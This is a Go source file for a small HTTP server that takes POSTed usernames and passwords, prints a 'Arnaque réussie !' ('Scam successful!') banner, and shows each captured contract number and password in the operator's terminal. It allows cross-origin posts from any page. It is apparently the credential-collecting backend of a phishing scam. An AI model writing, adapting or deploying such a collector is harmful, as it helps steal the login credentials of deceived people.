package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"golang.org/x/crypto/ssh/terminal"
)

func getRoot(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		return
	}

	buf := new(strings.Builder)
	_, err := io.Copy(buf, r.Body)
	if err != nil {
		log.Panic(err)
	}

	var m struct {
		Password string
		Username string
	}

	str := buf.String()
	err = json.Unmarshal([]byte(str), &m)
	if err != nil {
		log.Panic(err)
	}

	width, height, err := terminal.GetSize(0)
	if err != nil {
		log.Panic(err)
	}

	fmt.Printf(strings.Repeat("\n", height/2))

	fmt.Printf("%s%s%s",
		strings.Repeat("=", width/2-len(" Arnaque réussie ! ")/2),
		" Arnaque réussie ! ",
		strings.Repeat("=", width/2-len(" Arnaque réussie ! ")/2))

	fmt.Printf(strings.Repeat("\n", 4))

	contractLine := fmt.Sprintf("Numéro de contrat: %s", m.Username)
	passwordLine := fmt.Sprintf("Mot de passe: %s", m.Password)

	longest := max(len(contractLine), len(passwordLine))

	padding := width/2 - longest/2

	fmt.Print(strings.Repeat(" ", padding))
	fmt.Println(contractLine)

	fmt.Printf("\n%s%s", strings.Repeat(" ", padding), passwordLine)
	fmt.Printf(strings.Repeat("\n", height/4*3-8))

	w.Header().Set("Access-Control-Allow-Origin", "*")
	io.WriteString(w, "ok\n")
}

func main() {
	http.HandleFunc("/", getRoot)
	fmt.Println("Listening on 0.0.0.0:3333")
	err := http.ListenAndServe(":3333", nil)

	if errors.Is(err, http.ErrServerClosed) {
		fmt.Printf("server closed\n")
	} else if err != nil {
		fmt.Printf("error starting server: %s\n", err)
		os.Exit(1)
	}
}
